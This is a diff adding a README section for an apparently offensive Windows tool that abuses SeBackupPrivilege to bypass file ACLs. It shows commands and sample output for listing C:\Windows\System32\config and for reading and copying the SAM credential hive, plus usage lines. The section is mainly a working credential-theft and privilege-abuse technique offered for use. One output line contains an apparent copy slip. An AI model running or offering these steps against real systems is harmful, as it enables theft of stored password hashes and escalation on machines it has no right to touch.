@@ -98,3 +98,56 @@ User Name           SID
 =================== =============================================
 nt authority\system S-1-5-18
 ```
+
+
+---
+
+## [SeBackupPrivilege File Access Tool (C)](https://github.com/0xUnd3adBeef/DIY-Tools/blob/main/SeBackupPrivilege-Abuse.c)
+
+C tool that abuses SeBackupPrivilege to read and copy files that would otherwise be inaccessible, including system-protected files like the SAM hive. The tool enables the privilege and provides basic file operations (`ls`, `cat`, `cp`) that bypass normal ACL checks using `FILE_FLAG_BACKUP_SEMANTICS`. Please note that explicit DENY will block you anyways since denials have priority over broad allows.
+
+```powershell
+# List files in a protected directory
+PS C:\tools> .\SeBackupAbuse.exe ls C:\Windows\System32\config
+[+] Successfully opened token
+[+] Successfully enabled SeBackupPrivilege
+Listing files in directory C:\Windows\System32\config\*
+.
+..
+SAM
+SYSTEM
+SECURITY
+SOFTWARE
+DEFAULT
+...
+
+# Read protected files directly
+PS C:\tools> .\SeBackupAbuse.exe cat C:\Windows\System32\config\SAM
+[+] Successfully opened token
+[+] Successfully enabled SeBackupPrivilege
+# note that first bytes will be UTF16 BOM then actual data follows
+
+# Copy protected files to current directory
+PS C:\tools> .\SeBackupAbuse.exe cp C:\Windows\System32\config\SAM
+[+] Successfully opened token
+[+] Successfully enabled SeBackupAbuse.exe
+[*] Copying C:\Windows\System32\config\SAM -> .\SAM
+[+] Source opened successfully
+[+] Destination created successfully
+[+] Copied 8192 bytes (total: 8192)
+[+] Copy complete: 65536 total bytes
+
+# Verify the copy worked
+PS C:\tools> dir SAM
+
+    Directory: C:\tools
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        23/02/2026     15:42          65536 SAM
+```
+
+### Usage
+- `SeBackupAbuse.exe ls <directory>` - List files in a directory (append `\*`)
+- `SeBackupAbuse.exe cat <file>` - Display file contents
+- `SeBackupAbuse.exe cp <source> [destination]` - Copy file (defaults to current directory)
